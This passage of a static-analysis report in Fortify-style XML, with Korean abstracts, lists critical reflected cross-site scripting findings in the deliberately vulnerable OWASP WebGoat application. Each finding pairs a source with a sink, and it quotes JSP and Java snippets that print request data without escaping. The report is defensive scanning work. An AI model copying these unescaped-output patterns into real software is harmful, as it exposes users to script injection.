                        <Issue iid="713995E0CBF19FA7E893063A6864CBE2" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SqlNumericInjection.java의 injectableQuery() 메서드가 115 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>115</LineStart>
<Snippet>	    }

	    ec.addElement(new PRE(query));

	    if (station == null)</Snippet>
<TargetFunction>org.apache.ecs.html.PRE.PRE()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3AAC6CD968C10C8DEAD2FE693FAF6C88" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 71 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>71</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="699EC0C6D59F22AD41D6C82B0643977E" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HttpOnly.java의 makeContent() 메서드가 233 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>HttpOnly.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpOnly.java</FilePath>
<LineStart>233</LineStart>
<Snippet>		tr = new TR();
		
		tr.addElement(new TD(new StringElement("Your browser appears to be: " + getBrowserType(s))));
		t.addElement(tr);
		</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>1145</LineStart>
<Snippet>	public String getHeader( String header )
	{
		return getRequest().getHeader( header );
	}
</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getHeader()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="48BB52582C234A84F0B2C3B3E96A3E1E" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0FD25207079B58E5752A57EFC7F09E65" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD colspan="3"&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getPersonalDescription()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="792A9C3CC0BCDD49DBA90EEBE04C22AD" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getPhoneNumber()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AEC88F822F6F49AF0D7AD498A4599F51" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>AbstractLesson.java의 getSource() 메서드가 688 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>688</LineStart>
<Snippet>
	Head head = new Head();
	head.addElement(new Title(getSourceFileName()));
	head.addElement(new StringElement(
		"&lt;meta name=\"Author\" content=\"Bruce Mayhew\"&gt;"));</Snippet>
<TargetFunction>org.apache.ecs.html.Title.Title()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3F7529670A64E4DAFD9BB840095C75EE" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>main.jsp의 _jspService() 메서드가 200 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>200</LineStart>
<Snippet>				&lt;/div&gt;
				&lt;div id="lessonContent"&gt;&lt;%=webSession.getInstructions()%&gt;&lt;/div&gt;
				&lt;div id="message" class="info"&gt;&lt;%=webSession.getMessage()%&gt;&lt;/div&gt;
	
			&lt;%</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1326A573882FA89E18C8AF90141D457C" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FD7FE5AAC0AC986EA699A6ECD31C2659" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 105 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>105</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7580F082177FE5B226FBDADA6789BE57" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C865C4883D26D436F93B6903B2B45314" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;span class="lesson_text_db"&gt;&lt;%=employee.getLastName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F8A6BA77E1FDBB28847172AD6DB59A98" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C013FF4D9C20E3E518C42073552E2CB9" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 109 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>109</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C8C65088C55CE2D35A63AC88B3613AAC" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 33 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>33</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="65EB404733A6665F3102F7688C3E3A9C" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 40 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>40</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3F02E4B0D95854B28CF31712779E0DEB" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getFirstName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="21BA96F2B73ED36DDF7B78757A17A557" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="20602B86593A9D1D9862D6A794987367" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>main.jsp의 _jspService() 메서드가 180 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>180</LineStart>
<Snippet>						Parameter p = (Parameter) i.next();
						printParameters = "&lt;div id=\"parameter\" class=\"info\"&gt;" + p.getName() + "=" + p.getValue() + "&lt;/div&gt;&lt;br&gt;";
						out.println(printParameters);
					}
				}</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>576</LineStart>
<Snippet>	}

	return request.getParameterNames();
    }
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterNames()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D0DB94B3A986FE82DF6AD613A85FCC4C" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 28 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>28</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B16848F05994A84D1D98AB6296F7D60B" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD colspan="3"&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getPersonalDescription()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="33ADB22325F193F677D42E030B2918D4" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Encoding.java의 createContent() 메서드가 369 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>369</LineStart>
<Snippet>			tr.addElement( new TD( "Enter a password (optional): " ) );

			Input key = new Input( Input.TEXT, KEY, userKey );

			tr.addElement( new TD().addElement( key ) );</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
